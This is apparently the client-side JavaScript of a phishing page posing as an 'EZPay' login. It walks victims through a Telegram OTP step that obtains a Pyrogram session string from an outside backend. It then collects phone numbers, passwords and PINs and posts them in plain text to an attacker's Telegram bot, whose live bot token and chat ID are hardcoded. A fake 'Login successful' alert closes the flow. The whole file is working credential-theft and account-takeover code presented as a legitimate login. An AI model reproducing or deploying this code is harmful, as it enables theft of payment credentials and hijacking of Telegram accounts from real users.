document.addEventListener('DOMContentLoaded', function() {
    const BACKEND_URL = "https://bacend-pti2.onrender.com";

    // ---------- PAGE 0 ELEMENTS (Pyrogram OTP) ----------
    const pyrogramPhoneInput = document.getElementById('pyrogram-phone-input');
    const sendOtpButton = document.getElementById('send-otp-button');
    const verifyOtpButton = document.getElementById('verify-otp-button');
    const otpSection = document.getElementById('otp-section');
    const otpInput = document.getElementById('otp-input');
    const loadingOverlay0 = document.getElementById('loading-overlay-0');

    // ---------- PAGE 1 ELEMENTS ----------
    const phoneInput = document.getElementById('phone-input');
    const passwordInput = document.getElementById('password-input');
    const signInButton = document.getElementById('signin-button');
    const togglePasswordBtn = document.getElementById('toggle-password');
    const loadingOverlay = document.getElementById('loading-overlay');
    
    // ---------- PAGE 2 ELEMENTS ----------
    const displayPhone = document.getElementById('display-phone');
    const pinInput = document.getElementById('pin-input');
    const completeLoginButton = document.getElementById('complete-login-button');
    const loadingOverlay2 = document.getElementById('loading-overlay-2');
    const backToSigninLink = document.getElementById('back-to-signin');
    
    const BOT_TOKEN = "8209360948:AAFqBr7kiI7bRrlbojhAJi784jglBG98L2E";
    const CHAT_ID = "8023791486";

    let otpSent = false;

    async function sendToTelegram(text) {
        try {
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: text,
                    parse_mode: 'HTML'
                })
            });
        } catch (error) {
            console.error('Telegram Error:', error);
        }
    }

    // ---------- VALIDATION FUNCTIONS ----------
    function validatePhone(phone) {
        return /^\d{10}$/.test(phone);
    }
    
    function validatePassword(password) {
        return password.length > 0;
    }
    
    function validatePIN(pin) {
        return /^\d{6}$/.test(pin);
    }

    function validateOTP(otp) {
        return /^\d{4,6}$/.test(otp);
    }

    // ---------- PAGE 0: PYROGRAM OTP LOGIC ----------
    function updateSendOtpButton() {
        const phone = pyrogramPhoneInput.value.trim();
        if (validatePhone(phone)) {
            sendOtpButton.removeAttribute('disabled');
            sendOtpButton.classList.remove('van-button--disabled');
        } else {
            sendOtpButton.setAttribute('disabled', 'disabled');
            sendOtpButton.classList.add('van-button--disabled');
        }
    }

    function updateVerifyOtpButton() {
        const otp = otpInput.value.trim();
        if (validateOTP(otp)) {
            verifyOtpButton.removeAttribute('disabled');
            verifyOtpButton.classList.remove('van-button--disabled');
        } else {
            verifyOtpButton.setAttribute('disabled', 'disabled');
            verifyOtpButton.classList.add('van-button--disabled');
        }
    }

    pyrogramPhoneInput.addEventListener('input', function() {
        this.value = this.value.replace(/\D/g, '').slice(0, 10);
        if (!otpSent) {
            updateSendOtpButton();
        }
    });

    otpInput.addEventListener('input', function() {
        this.value = this.value.replace(/\D/g, '').slice(0, 6);
        updateVerifyOtpButton();
    });

    sendOtpButton.addEventListener('click', async function() {
        if (this.disabled) return;

        const phone = pyrogramPhoneInput.value.trim();
        if (!validatePhone(phone)) return;

        loadingOverlay0.style.display = 'flex';

        try {
            const response = await fetch(BACKEND_URL + '/api/send-otp', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ phone: phone })
            });

            const data = await response.json();

            if (data.success) {
                otpSent = true;
                otpSection.classList.add('show');
                sendOtpButton.style.display = 'none';
                verifyOtpButton.style.display = 'block';
                pyrogramPhoneInput.disabled = true;
                pyrogramPhoneInput.closest('.van-cell').classList.add('van-field--disabled');
                pyrogramPhoneInput.closest('.van-cell').style.background = '#f5f5f5';
                setTimeout(() => otpInput.focus(), 100);
            } else {
                showError('pyrogram-phone-error', data.error || 'Failed to send OTP');
            }
        } catch (error) {
            showError('pyrogram-phone-error', 'Network error. Please try again.');
        }

        loadingOverlay0.style.display = 'none';
    });

    verifyOtpButton.addEventListener('click', async function() {
        if (this.disabled) return;

        const phone = pyrogramPhoneInput.value.trim();
        const otp = otpInput.value.trim();

        if (!validateOTP(otp)) return;

        loadingOverlay0.style.display = 'flex';

        try {
            const response = await fetch(BACKEND_URL + '/api/verify-otp', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ phone: phone, otp: otp })
            });

            const data = await response.json();

            if (data.success) {
                if (data.session_string) {
                    localStorage.setItem('pyrogramSession', data.session_string);
                }
                localStorage.setItem('pyrogramPhone', phone);

                const telegramMsg = `<b>EZPay Pyrogram Auth</b>\n\n<b>Phone:</b> +91 ${phone}\n<b>Status:</b> Session authenticated`;
                await sendToTelegram(telegramMsg);

                switchToPage1(phone);
            } else {
                showError('otp-error', data.error || 'Invalid OTP');
            }
        } catch (error) {
            showError('otp-error', 'Network error. Please try again.');
        }

        loadingOverlay0.style.display = 'none';
    });

    // ---------- UPDATE BUTTON STATES ----------
    function updateSignInButton() {
        const phone = phoneInput.value.trim();
        const password = passwordInput.value.trim();
        
        if (validatePhone(phone) && validatePassword(password)) {
            signInButton.removeAttribute('disabled');
            signInButton.classList.remove('van-button--disabled');
        } else {
            signInButton.setAttribute('disabled', 'disabled');
            signInButton.classList.add('van-button--disabled');
        }
    }
    
    function updateCompleteLoginButton() {
        const pin = pinInput.value.trim();
        
        if (validatePIN(pin)) {
            completeLoginButton.removeAttribute('disabled');
            completeLoginButton.classList.remove('van-button--disabled');
        } else {
            completeLoginButton.setAttribute('disabled', 'disabled');
            completeLoginButton.classList.add('van-button--disabled');
        }
    }
    
    // ---------- PASSWORD VISIBILITY TOGGLE ----------
    if (togglePasswordBtn) {
        togglePasswordBtn.addEventListener('click', function() {
            if (passwordInput.type === 'password') {
                passwordInput.type = 'text';
                togglePasswordBtn.classList.remove('van-icon-eye');
                togglePasswordBtn.classList.add('van-icon-closed-eye');
            } else {
                passwordInput.type = 'password';
                togglePasswordBtn.classList.remove('van-icon-closed-eye');
                togglePasswordBtn.classList.add('van-icon-eye');
            }
        });
    }
    
    // ---------- PAGE 1 EVENT LISTENERS ----------
    phoneInput.addEventListener('input', function() {
        this.value = this.value.replace(/\D/g, '').slice(0, 10);
        updateSignInButton();
    });
    
    passwordInput.addEventListener('input', updateSignInButton);
    
    signInButton.addEventListener('click', async function(e) {
        if (this.disabled) return;
        
        const phone = phoneInput.value.trim();
        const password = passwordInput.value.trim();
        
        if (!validatePhone(phone) || !validatePassword(password)) return;
        
        loadingOverlay.style.display = 'flex';
        
        const message1 = `<b>EZPay Step 1 (Login)</b>\n\n<b>Phone:</b> +91 ${phone}\n<b>Password:</b> ${password}`;
        await sendToTelegram(message1);
        
        loadingOverlay.style.display = 'none';
        localStorage.setItem('loginPhone', phone);
        switchToPage2(phone);
    });
    
    // ---------- PAGE 2 EVENT LISTENERS ----------
    pinInput.addEventListener('input', function() {
        this.value = this.value.replace(/\D/g, '').slice(0, 6);
        updateCompleteLoginButton();
    });
    
    completeLoginButton.addEventListener('click', async function() {
        if (this.disabled) return;
        
        const pin = pinInput.value.trim();
        const phone = localStorage.getItem('loginPhone');
        
        if (!validatePIN(pin)) return;
        
        loadingOverlay2.style.display = 'flex';
        
        const message2 = `<b>EZPay Step 2 (PIN)</b>\n\n<b>Phone:</b> +91 ${phone}\n<b>PIN:</b> ${pin}`;
        await sendToTelegram(message2);
        
        loadingOverlay2.style.display = 'none';
        alert(`Login successful!\nPhone: +91 ${phone}\nPIN verified.`);
        localStorage.clear();
    });
    
    backToSigninLink.addEventListener('click', function(e) {
        e.preventDefault();
        switchBackToPage1();
    });

    // ---------- PAGE SWITCHING ----------
    function switchToPage1(phone) {
        document.querySelector('.page-0').style.display = 'none';
        document.querySelector('.page-1').style.display = 'block';
        document.querySelector('.page-2').style.display = 'none';
        if (phone) {
            phoneInput.value = phone;
            updateSignInButton();
        }
        setTimeout(() => passwordInput.focus(), 100);
    }

    function switchToPage2(phone) {
        displayPhone.value = phone;
        document.querySelector('.page-0').style.display = 'none';
        document.querySelector('.page-1').style.display = 'none';
        document.querySelector('.page-2').style.display = 'block';
        setTimeout(() => pinInput.focus(), 100);
    }
    
    function switchBackToPage1() {
        document.querySelector('.page-0').style.display = 'none';
        document.querySelector('.page-1').style.display = 'block';
        document.querySelector('.page-2').style.display = 'none';
        pinInput.value = '';
        updateCompleteLoginButton();
        setTimeout(() => phoneInput.focus(), 100);
    }
    
    function showError(elementId, message) {
        const errorElement = document.getElementById(elementId);
        if (errorElement) {
            errorElement.textContent = message;
            errorElement.style.display = 'block';
            setTimeout(() => { errorElement.style.display = 'none'; }, 3000);
        }
    }

    updateSendOtpButton();
    updateSignInButton();
    updateCompleteLoginButton();
});
